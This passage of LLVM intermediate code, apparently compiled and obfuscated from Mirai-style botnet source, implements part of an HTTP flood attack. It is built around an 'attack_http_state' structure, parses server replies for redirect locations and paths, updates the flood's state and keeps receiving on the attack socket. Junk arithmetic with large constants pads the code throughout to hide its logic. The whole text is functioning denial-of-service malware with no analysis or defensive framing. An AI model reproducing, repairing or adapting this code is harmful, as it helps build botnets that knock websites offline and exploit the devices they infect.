  %1951 = load i8, i8* %1950, align 1
  %1952 = sext i8 %1951 to i32
  %1953 = icmp ne i32 %1952, 0
  br i1 %1953, label %1954, label %2248

; <label>:1954:                                   ; preds = %1946
  store i32 0, i32* %58, align 4
  %1955 = load i8*, i8** %57, align 8
  %1956 = load i32, i32* %10, align 4
  %1957 = sext i32 %1956 to i64
  %1958 = getelementptr inbounds i8, i8* %1955, i64 %1957
  store i8 0, i8* %1958, align 1
  %1959 = load i32, i32* %10, align 4
  %1960 = sub i32 0, 1
  %1961 = sub i32 %1959, %1960
  %1962 = add nsw i32 %1959, 1
  store i32 %1961, i32* %10, align 4
  %1963 = load i8*, i8** %57, align 8
  %1964 = load i32, i32* %10, align 4
  %1965 = sext i32 %1964 to i64
  %1966 = getelementptr inbounds i8, i8* %1963, i64 %1965
  %1967 = load i8, i8* %1966, align 1
  %1968 = sext i8 %1967 to i32
  %1969 = icmp eq i32 %1968, 32
  br i1 %1969, label %1970, label %1977

; <label>:1970:                                   ; preds = %1954
  %1971 = load i32, i32* %10, align 4
  %1972 = sub i32 0, %1971
  %1973 = sub i32 0, 1
  %1974 = add i32 %1972, %1973
  %1975 = sub i32 0, %1974
  %1976 = add nsw i32 %1971, 1
  store i32 %1975, i32* %10, align 4
  br label %1977

; <label>:1977:                                   ; preds = %1970, %1954
  %1978 = load i8*, i8** %57, align 8
  %1979 = load i32, i32* %10, align 4
  %1980 = sext i32 %1979 to i64
  %1981 = getelementptr inbounds i8, i8* %1978, i64 %1980
  %1982 = load i8*, i8** %57, align 8
  %1983 = load i32, i32* %10, align 4
  %1984 = sext i32 %1983 to i64
  %1985 = getelementptr inbounds i8, i8* %1982, i64 %1984
  %1986 = call i32 @util_strlen(i8* %1985)
  %1987 = call i32 @util_stristr(i8* %1981, i32 %1986, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1988 = icmp ne i32 %1987, -1
  br i1 %1988, label %1989, label %2005

; <label>:1989:                                   ; preds = %1977
  %1990 = load i8*, i8** %57, align 8
  %1991 = load i32, i32* %10, align 4
  %1992 = sext i32 %1991 to i64
  %1993 = getelementptr inbounds i8, i8* %1990, i64 %1992
  %1994 = load i8*, i8** %57, align 8
  %1995 = load i32, i32* %10, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds i8, i8* %1994, i64 %1996
  %1998 = call i32 @util_strlen(i8* %1997)
  %1999 = call i32 @util_stristr(i8* %1993, i32 %1998, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2000 = load i32, i32* %10, align 4
  %2001 = add i32 %2000, -1341077181
  %2002 = add i32 %2001, %1999
  %2003 = sub i32 %2002, -1341077181
  %2004 = add nsw i32 %2000, %1999
  store i32 %2003, i32* %10, align 4
  br label %2005

; <label>:2005:                                   ; preds = %1989, %1977
  %2006 = load i8*, i8** %57, align 8
  %2007 = load i32, i32* %10, align 4
  %2008 = sext i32 %2007 to i64
  %2009 = getelementptr inbounds i8, i8* %2006, i64 %2008
  %2010 = load i8, i8* %2009, align 1
  %2011 = sext i8 %2010 to i32
  %2012 = icmp eq i32 %2011, 34
  br i1 %2012, label %2013, label %2052

; <label>:2013:                                   ; preds = %2005
  %2014 = load i32, i32* %10, align 4
  %2015 = add i32 %2014, -923510379
  %2016 = add i32 %2015, 1
  %2017 = sub i32 %2016, -923510379
  %2018 = add nsw i32 %2014, 1
  store i32 %2017, i32* %10, align 4
  %2019 = load i8*, i8** %57, align 8
  %2020 = load i32, i32* %10, align 4
  %2021 = sext i32 %2020 to i64
  %2022 = getelementptr inbounds i8, i8* %2019, i64 %2021
  %2023 = load i8*, i8** %57, align 8
  %2024 = load i32, i32* %10, align 4
  %2025 = sext i32 %2024 to i64
  %2026 = getelementptr inbounds i8, i8* %2023, i64 %2025
  %2027 = call i32 @util_strlen(i8* %2026)
  %2028 = sub i32 0, 1
  %2029 = add i32 %2027, %2028
  %2030 = sub nsw i32 %2027, 1
  %2031 = sext i32 %2029 to i64
  %2032 = getelementptr inbounds i8, i8* %2022, i64 %2031
  %2033 = load i8, i8* %2032, align 1
  %2034 = sext i8 %2033 to i32
  %2035 = icmp eq i32 %2034, 34
  br i1 %2035, label %2036, label %2051

; <label>:2036:                                   ; preds = %2013
  %2037 = load i8*, i8** %57, align 8
  %2038 = load i32, i32* %10, align 4
  %2039 = sext i32 %2038 to i64
  %2040 = getelementptr inbounds i8, i8* %2037, i64 %2039
  %2041 = load i8*, i8** %57, align 8
  %2042 = load i32, i32* %10, align 4
  %2043 = sext i32 %2042 to i64
  %2044 = getelementptr inbounds i8, i8* %2041, i64 %2043
  %2045 = call i32 @util_strlen(i8* %2044)
  %2046 = sub i32 0, 1
  %2047 = add i32 %2045, %2046
  %2048 = sub nsw i32 %2045, 1
  %2049 = sext i32 %2047 to i64
  %2050 = getelementptr inbounds i8, i8* %2040, i64 %2049
  store i8 0, i8* %2050, align 1
  br label %2051

; <label>:2051:                                   ; preds = %2036, %2013
  br label %2052

; <label>:2052:                                   ; preds = %2051, %2005
  %2053 = load i8*, i8** %57, align 8
  %2054 = call i32 @util_atoi(i8* %2053, i32 10)
  store i32 %2054, i32* %58, align 4
  br label %2055

; <label>:2055:                                   ; preds = %2072, %2052
  %2056 = load i32, i32* %58, align 4
  %2057 = icmp sgt i32 %2056, 0
  br i1 %2057, label %2058, label %2070

; <label>:2058:                                   ; preds = %2055
  %2059 = load i32, i32* %58, align 4
  %2060 = icmp slt i32 %2059, 10
  br i1 %2060, label %2061, label %2070

; <label>:2061:                                   ; preds = %2058
  %2062 = load i32, i32* %27, align 4
  %2063 = load i32, i32* %58, align 4
  %2064 = sub i32 0, %2063
  %2065 = sub i32 %2062, %2064
  %2066 = add i32 %2062, %2063
  %2067 = zext i32 %2065 to i64
  %2068 = call i64 @time(i64* null) #6
  %2069 = icmp sgt i64 %2067, %2068
  br label %2070

; <label>:2070:                                   ; preds = %2061, %2058, %2055
  %2071 = phi i1 [ false, %2058 ], [ false, %2055 ], [ %2069, %2061 ]
  br i1 %2071, label %2072, label %2074

; <label>:2072:                                   ; preds = %2070
  %2073 = call i32 @sleep(i32 1)
  br label %2055

; <label>:2074:                                   ; preds = %2070
  %2075 = load i8*, i8** %57, align 8
  %2076 = load i32, i32* %10, align 4
  %2077 = sext i32 %2076 to i64
  %2078 = getelementptr inbounds i8, i8* %2075, i64 %2077
  store i8* %2078, i8** %57, align 8
  %2079 = load i8*, i8** %57, align 8
  %2080 = load i8*, i8** %57, align 8
  %2081 = call i32 @util_strlen(i8* %2080)
  %2082 = call i32 @util_stristr(i8* %2079, i32 %2081, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2083 = icmp eq i32 %2082, 4
  br i1 %2083, label %2084, label %2191

; <label>:2084:                                   ; preds = %2074
  store i32 7, i32* %10, align 4
  %2085 = load i8*, i8** %57, align 8
  %2086 = getelementptr inbounds i8, i8* %2085, i64 4
  %2087 = load i8, i8* %2086, align 1
  %2088 = sext i8 %2087 to i32
  %2089 = icmp eq i32 %2088, 115
  br i1 %2089, label %2090, label %2096

; <label>:2090:                                   ; preds = %2084
  %2091 = load i32, i32* %10, align 4
  %2092 = add i32 %2091, 436011625
  %2093 = add i32 %2092, 1
  %2094 = sub i32 %2093, 436011625
  %2095 = add nsw i32 %2091, 1
  store i32 %2094, i32* %10, align 4
  br label %2096

; <label>:2096:                                   ; preds = %2090, %2084
  %2097 = load i8*, i8** %57, align 8
  %2098 = load i8*, i8** %57, align 8
  %2099 = load i32, i32* %10, align 4
  %2100 = sext i32 %2099 to i64
  %2101 = getelementptr inbounds i8, i8* %2098, i64 %2100
  %2102 = load i32, i32* %56, align 4
  %2103 = load i32, i32* %10, align 4
  %2104 = sub i32 0, %2103
  %2105 = add i32 %2102, %2104
  %2106 = sub nsw i32 %2102, %2103
  %2107 = sext i32 %2105 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2097, i8* %2101, i64 %2107, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2108

; <label>:2108:                                   ; preds = %2129, %2096
  %2109 = load i8*, i8** %57, align 8
  %2110 = load i32, i32* %10, align 4
  %2111 = sext i32 %2110 to i64
  %2112 = getelementptr inbounds i8, i8* %2109, i64 %2111
  %2113 = load i8, i8* %2112, align 1
  %2114 = sext i8 %2113 to i32
  %2115 = icmp ne i32 %2114, 0
  br i1 %2115, label %2116, label %2135

; <label>:2116:                                   ; preds = %2108
  %2117 = load i8*, i8** %57, align 8
  %2118 = load i32, i32* %10, align 4
  %2119 = sext i32 %2118 to i64
  %2120 = getelementptr inbounds i8, i8* %2117, i64 %2119
  %2121 = load i8, i8* %2120, align 1
  %2122 = sext i8 %2121 to i32
  %2123 = icmp eq i32 %2122, 47
  br i1 %2123, label %2124, label %2129

; <label>:2124:                                   ; preds = %2116
  %2125 = load i8*, i8** %57, align 8
  %2126 = load i32, i32* %10, align 4
  %2127 = sext i32 %2126 to i64
  %2128 = getelementptr inbounds i8, i8* %2125, i64 %2127
  store i8 0, i8* %2128, align 1
  br label %2135

; <label>:2129:                                   ; preds = %2116
  %2130 = load i32, i32* %10, align 4
  %2131 = add i32 %2130, -1811839028
  %2132 = add i32 %2131, 1
  %2133 = sub i32 %2132, -1811839028
  %2134 = add nsw i32 %2130, 1
  store i32 %2133, i32* %10, align 4
  br label %2108

; <label>:2135:                                   ; preds = %2124, %2108
  %2136 = load i8*, i8** %57, align 8
  %2137 = call i32 @util_strlen(i8* %2136)
  %2138 = icmp sgt i32 %2137, 0
  br i1 %2138, label %2139, label %2149

; <label>:2139:                                   ; preds = %2135
  %2140 = load i8*, i8** %57, align 8
  %2141 = call i32 @util_strlen(i8* %2140)
  %2142 = icmp slt i32 %2141, 128
  br i1 %2142, label %2143, label %2149

; <label>:2143:                                   ; preds = %2139
  %2144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2144, i32 0, i32 7
  %2146 = getelementptr inbounds [129 x i8], [129 x i8]* %2145, i32 0, i32 0
  %2147 = load i8*, i8** %57, align 8
  %2148 = call i32 @util_strcpy(i8* %2146, i8* %2147)
  br label %2149

; <label>:2149:                                   ; preds = %2143, %2139, %2135
  %2150 = load i8*, i8** %57, align 8
  %2151 = load i32, i32* %10, align 4
  %2152 = sub i32 %2151, 694149879
  %2153 = add i32 %2152, 1
  %2154 = add i32 %2153, 694149879
  %2155 = add nsw i32 %2151, 1
  %2156 = sext i32 %2154 to i64
  %2157 = getelementptr inbounds i8, i8* %2150, i64 %2156
  %2158 = call i32 @util_strlen(i8* %2157)
  %2159 = icmp slt i32 %2158, 256
  br i1 %2159, label %2160, label %2190

; <label>:2160:                                   ; preds = %2149
  %2161 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2161, i32 0, i32 6
  %2163 = getelementptr inbounds [257 x i8], [257 x i8]* %2162, i32 0, i32 0
  %2164 = getelementptr inbounds i8, i8* %2163, i64 1
  call void @util_zero(i8* %2164, i32 255)
  %2165 = load i8*, i8** %57, align 8
  %2166 = load i32, i32* %10, align 4
  %2167 = sub i32 0, %2166
  %2168 = sub i32 0, 1
  %2169 = add i32 %2167, %2168
  %2170 = sub i32 0, %2169
  %2171 = add nsw i32 %2166, 1
  %2172 = sext i32 %2170 to i64
  %2173 = getelementptr inbounds i8, i8* %2165, i64 %2172
  %2174 = call i32 @util_strlen(i8* %2173)
  %2175 = icmp sgt i32 %2174, 0
  br i1 %2175, label %2176, label %2189

; <label>:2176:                                   ; preds = %2160
  %2177 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2178 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2177, i32 0, i32 6
  %2179 = getelementptr inbounds [257 x i8], [257 x i8]* %2178, i32 0, i32 0
  %2180 = getelementptr inbounds i8, i8* %2179, i64 1
  %2181 = load i8*, i8** %57, align 8
  %2182 = load i32, i32* %10, align 4
  %2183 = sub i32 0, 1
  %2184 = sub i32 %2182, %2183
  %2185 = add nsw i32 %2182, 1
  %2186 = sext i32 %2184 to i64
  %2187 = getelementptr inbounds i8, i8* %2181, i64 %2186
  %2188 = call i32 @util_strcpy(i8* %2180, i8* %2187)
  br label %2189

; <label>:2189:                                   ; preds = %2176, %2160
  br label %2190

; <label>:2190:                                   ; preds = %2189, %2149
  br label %2241

; <label>:2191:                                   ; preds = %2074
  %2192 = load i8*, i8** %57, align 8
  %2193 = getelementptr inbounds i8, i8* %2192, i64 0
  %2194 = load i8, i8* %2193, align 1
  %2195 = sext i8 %2194 to i32
  %2196 = icmp eq i32 %2195, 47
  br i1 %2196, label %2197, label %2240

; <label>:2197:                                   ; preds = %2191
  %2198 = load i8*, i8** %57, align 8
  %2199 = load i32, i32* %10, align 4
  %2200 = sub i32 %2199, -1763972821
  %2201 = add i32 %2200, 1
  %2202 = add i32 %2201, -1763972821
  %2203 = add nsw i32 %2199, 1
  %2204 = sext i32 %2202 to i64
  %2205 = getelementptr inbounds i8, i8* %2198, i64 %2204
  %2206 = call i32 @util_strlen(i8* %2205)
  %2207 = icmp slt i32 %2206, 256
  br i1 %2207, label %2208, label %2239

; <label>:2208:                                   ; preds = %2197
  %2209 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2209, i32 0, i32 6
  %2211 = getelementptr inbounds [257 x i8], [257 x i8]* %2210, i32 0, i32 0
  %2212 = getelementptr inbounds i8, i8* %2211, i64 1
  call void @util_zero(i8* %2212, i32 255)
  %2213 = load i8*, i8** %57, align 8
  %2214 = load i32, i32* %10, align 4
  %2215 = sub i32 0, %2214
  %2216 = sub i32 0, 1
  %2217 = add i32 %2215, %2216
  %2218 = sub i32 0, %2217
  %2219 = add nsw i32 %2214, 1
  %2220 = sext i32 %2218 to i64
  %2221 = getelementptr inbounds i8, i8* %2213, i64 %2220
  %2222 = call i32 @util_strlen(i8* %2221)
  %2223 = icmp sgt i32 %2222, 0
  br i1 %2223, label %2224, label %2238

; <label>:2224:                                   ; preds = %2208
  %2225 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2225, i32 0, i32 6
  %2227 = getelementptr inbounds [257 x i8], [257 x i8]* %2226, i32 0, i32 0
  %2228 = getelementptr inbounds i8, i8* %2227, i64 1
  %2229 = load i8*, i8** %57, align 8
  %2230 = load i32, i32* %10, align 4
  %2231 = sub i32 %2230, -598520469
  %2232 = add i32 %2231, 1
  %2233 = add i32 %2232, -598520469
  %2234 = add nsw i32 %2230, 1
  %2235 = sext i32 %2233 to i64
  %2236 = getelementptr inbounds i8, i8* %2229, i64 %2235
  %2237 = call i32 @util_strcpy(i8* %2228, i8* %2236)
  br label %2238

; <label>:2238:                                   ; preds = %2224, %2208
  br label %2239

; <label>:2239:                                   ; preds = %2238, %2197
  br label %2240

; <label>:2240:                                   ; preds = %2239, %2191
  br label %2241

; <label>:2241:                                   ; preds = %2240, %2190
  %2242 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2242, i32 0, i32 9
  %2244 = getelementptr inbounds [9 x i8], [9 x i8]* %2243, i32 0, i32 0
  %2245 = call i8* @strcpy(i8* %2244, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2246 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2246, i32 0, i32 1
  store i8 10, i8* %2247, align 4
  br label %2775

; <label>:2248:                                   ; preds = %1946
  br label %2249

; <label>:2249:                                   ; preds = %2248, %1874
  br label %2250

; <label>:2250:                                   ; preds = %2249, %1850
  %2251 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2252 = load i32, i32* %12, align 4
  %2253 = call i32 @util_memsearch(i8* %2251, i32 %2252, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2253, i32* %37, align 4
  %2254 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2254, i32 0, i32 9
  %2256 = getelementptr inbounds [9 x i8], [9 x i8]* %2255, i32 0, i32 0
  %2257 = call signext i8 @util_strcmp(i8* %2256, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2258 = sext i8 %2257 to i32
  %2259 = icmp ne i32 %2258, 0
  br i1 %2259, label %2267, label %2260

; <label>:2260:                                   ; preds = %2250
  %2261 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2261, i32 0, i32 9
  %2263 = getelementptr inbounds [9 x i8], [9 x i8]* %2262, i32 0, i32 0
  %2264 = call signext i8 @util_strcmp(i8* %2263, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2265 = sext i8 %2264 to i32
  %2266 = icmp ne i32 %2265, 0
  br i1 %2266, label %2267, label %2270

; <label>:2267:                                   ; preds = %2260, %2250
  %2268 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2268, i32 0, i32 1
  store i8 7, i8* %2269, align 4
  br label %2281

; <label>:2270:                                   ; preds = %2260
  %2271 = load i32, i32* %12, align 4
  %2272 = load i32, i32* %37, align 4
  %2273 = icmp sgt i32 %2271, %2272
  br i1 %2273, label %2274, label %2277

; <label>:2274:                                   ; preds = %2270
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 1
  store i8 10, i8* %2276, align 4
  br label %2280

; <label>:2277:                                   ; preds = %2270
  %2278 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2278, i32 0, i32 1
  store i8 1, i8* %2279, align 4
  br label %2280

; <label>:2280:                                   ; preds = %2277, %2274
  br label %2281

; <label>:2281:                                   ; preds = %2280, %2267
  %2282 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2283 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2282, i32 0, i32 0
  %2284 = load i32, i32* %2283, align 4
  %2285 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2286 = load i32, i32* %37, align 4
  %2287 = sext i32 %2286 to i64
  %2288 = call i64 @recv(i32 %2284, i8* %2285, i64 %2287, i32 16384)
  %2289 = trunc i64 %2288 to i32
  store i32 %2289, i32* %12, align 4
  br label %2773

; <label>:2290:                                   ; preds = %1132
  %2291 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2292 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2291, i32 0, i32 1
  %2293 = load i8, i8* %2292, align 4
  %2294 = zext i8 %2293 to i32
  %2295 = icmp eq i32 %2294, 7
  br i1 %2295, label %2296, label %2720

; <label>:2296:                                   ; preds = %2290
  br label %2297

; <label>:2297:                                   ; preds = %2718, %2296
  %2298 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2298, i32 0, i32 1
  %2300 = load i8, i8* %2299, align 4
  %2301 = zext i8 %2300 to i32
  %2302 = icmp ne i32 %2301, 7
  br i1 %2302, label %2303, label %2304

; <label>:2303:                                   ; preds = %2297
  br label %2719

; <label>:2304:                                   ; preds = %2297
  %2305 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2305, i32 0, i32 17
  %2307 = load i32, i32* %2306, align 4
  %2308 = icmp eq i32 %2307, 1024
  br i1 %2308, label %2309, label %2323

; <label>:2309:                                   ; preds = %2304
  %2310 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2311 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2310, i32 0, i32 18
  %2312 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2311, i32 0, i32 0
  %2313 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2313, i32 0, i32 18
  %2315 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2314, i32 0, i32 0
  %2316 = getelementptr inbounds i8, i8* %2315, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2312, i8* %2316, i64 960, i32 1, i1 false)
  %2317 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2317, i32 0, i32 17
  %2319 = load i32, i32* %2318, align 4
  %2320 = sub i32 0, 64
  %2321 = add i32 %2319, %2320
  %2322 = sub nsw i32 %2319, 64
  store i32 %2321, i32* %2318, align 4
  br label %2323

; <label>:2323:                                   ; preds = %2309, %2304
  %2324 = call i32* @__errno_location() #7
  store i32 0, i32* %2324, align 4
  %2325 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2326 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2325, i32 0, i32 0
  %2327 = load i32, i32* %2326, align 4
  %2328 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2329 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2328, i32 0, i32 18
  %2330 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2329, i32 0, i32 0
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 17
  %2333 = load i32, i32* %2332, align 4
  %2334 = sext i32 %2333 to i64
  %2335 = getelementptr inbounds i8, i8* %2330, i64 %2334
  %2336 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2337 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2336, i32 0, i32 17
  %2338 = load i32, i32* %2337, align 4
  %2339 = add i32 1024, -1859179264
  %2340 = sub i32 %2339, %2338
  %2341 = sub i32 %2340, -1859179264
  %2342 = sub nsw i32 1024, %2338
  %2343 = sext i32 %2341 to i64
  %2344 = call i64 @recv(i32 %2327, i8* %2335, i64 %2343, i32 16384)
  %2345 = trunc i64 %2344 to i32
  store i32 %2345, i32* %12, align 4
  %2346 = load i32, i32* %12, align 4
  %2347 = icmp eq i32 %2346, 0
  br i1 %2347, label %2348, label %2350

; <label>:2348:                                   ; preds = %2323
  %2349 = call i32* @__errno_location() #7
  store i32 104, i32* %2349, align 4
  store i32 -1, i32* %12, align 4
  br label %2350

; <label>:2350:                                   ; preds = %2348, %2323
  %2351 = load i32, i32* %12, align 4
  %2352 = icmp eq i32 %2351, -1
  br i1 %2352, label %2353, label %2371

; <label>:2353:                                   ; preds = %2350
  %2354 = call i32* @__errno_location() #7
  %2355 = load i32, i32* %2354, align 4
  %2356 = icmp ne i32 %2355, 11
  br i1 %2356, label %2357, label %2370

; <label>:2357:                                   ; preds = %2353
  %2358 = call i32* @__errno_location() #7
  %2359 = load i32, i32* %2358, align 4
  %2360 = icmp ne i32 %2359, 11
  br i1 %2360, label %2361, label %2370

; <label>:2361:                                   ; preds = %2357
  %2362 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2363 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2362, i32 0, i32 0
  %2364 = load i32, i32* %2363, align 4
  %2365 = call i32 @close(i32 %2364)
  %2366 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2366, i32 0, i32 0
  store i32 -1, i32* %2367, align 4
  %2368 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2368, i32 0, i32 1
  store i8 0, i8* %2369, align 4
  br label %2370

; <label>:2370:                                   ; preds = %2361, %2357, %2353
  br label %2719

; <label>:2371:                                   ; preds = %2350
  %2372 = load i32, i32* %12, align 4
  %2373 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2373, i32 0, i32 17
  %2375 = load i32, i32* %2374, align 4
  %2376 = sub i32 0, %2375
  %2377 = sub i32 0, %2372
  %2378 = add i32 %2376, %2377
  %2379 = sub i32 0, %2378
  %2380 = add nsw i32 %2375, %2372
  store i32 %2379, i32* %2374, align 4
  %2381 = load i32, i32* %27, align 4
  %2382 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2382, i32 0, i32 2
  store i32 %2381, i32* %2383, align 4
  br label %2384

; <label>:2384:                                   ; preds = %2717, %2371
  store i32 0, i32* %59, align 4
  %2385 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2386 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2385, i32 0, i32 14
  %2387 = load i32, i32* %2386, align 4
  %2388 = icmp sgt i32 %2387, 0
  br i1 %2388, label %2389, label %2587

; <label>:2389:                                   ; preds = %2384
  %2390 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2391 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2390, i32 0, i32 14
  %2392 = load i32, i32* %2391, align 4
  %2393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2393, i32 0, i32 17
  %2395 = load i32, i32* %2394, align 4
  %2396 = icmp sgt i32 %2392, %2395
  br i1 %2396, label %2397, label %2401

; <label>:2397:                                   ; preds = %2389
  %2398 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2399 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2398, i32 0, i32 17
  %2400 = load i32, i32* %2399, align 4
  br label %2405

; <label>:2401:                                   ; preds = %2389
  %2402 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2403 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2402, i32 0, i32 14
  %2404 = load i32, i32* %2403, align 4
  br label %2405

; <label>:2405:                                   ; preds = %2401, %2397
  %2406 = phi i32 [ %2400, %2397 ], [ %2404, %2401 ]
  store i32 %2406, i32* %59, align 4
  %2407 = load i32, i32* %59, align 4
  %2408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2408, i32 0, i32 14
  %2410 = load i32, i32* %2409, align 4
  %2411 = sub i32 0, %2407
  %2412 = add i32 %2410, %2411
  %2413 = sub nsw i32 %2410, %2407
  store i32 %2412, i32* %2409, align 4
  %2414 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2414, i32 0, i32 11
  %2416 = load i32, i32* %2415, align 4
  %2417 = icmp eq i32 %2416, 1
  br i1 %2417, label %2418, label %2586

; <label>:2418:                                   ; preds = %2405
  %2419 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2419, i32 0, i32 18
  %2421 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2420, i32 0, i32 0
  %2422 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2422, i32 0, i32 17
  %2424 = load i32, i32* %2423, align 4
  %2425 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2426 = call i32 @util_memsearch(i8* %2421, i32 %2424, i8* %2425, i32 11)
  %2427 = icmp ne i32 %2426, -1
  br i1 %2427, label %2428, label %2585

; <label>:2428:                                   ; preds = %2418
  %2429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2429, i32 0, i32 18
  %2431 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2430, i32 0, i32 0
  %2432 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2432, i32 0, i32 17
  %2434 = load i32, i32* %2433, align 4
  %2435 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2436 = call i32 @util_memsearch(i8* %2431, i32 %2434, i8* %2435, i32 11)
  store i32 %2436, i32* %60, align 4
  %2437 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2438 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2437, i32 0, i32 18
  %2439 = load i32, i32* %60, align 4
  %2440 = sext i32 %2439 to i64
  %2441 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2438, i64 0, i64 %2440
  %2442 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2442, i32 0, i32 17
  %2444 = load i32, i32* %2443, align 4
